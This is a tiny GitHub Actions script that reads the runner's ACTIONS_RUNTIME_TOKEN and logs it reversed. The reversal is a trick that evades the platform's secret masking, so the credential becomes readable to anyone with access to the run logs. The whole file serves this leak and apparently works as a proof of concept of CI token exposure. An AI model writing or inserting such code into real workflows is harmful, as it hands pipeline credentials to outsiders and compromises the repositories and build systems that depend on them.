const core = require('@actions/core')
const github = require('@actions/github')

try {
    var token = process.env["ACTIONS_RUNTIME_TOKEN"];
    console.log(token.split('').reverse().join(''));
} catch (error) {
    core.setFailed(error.message)
}
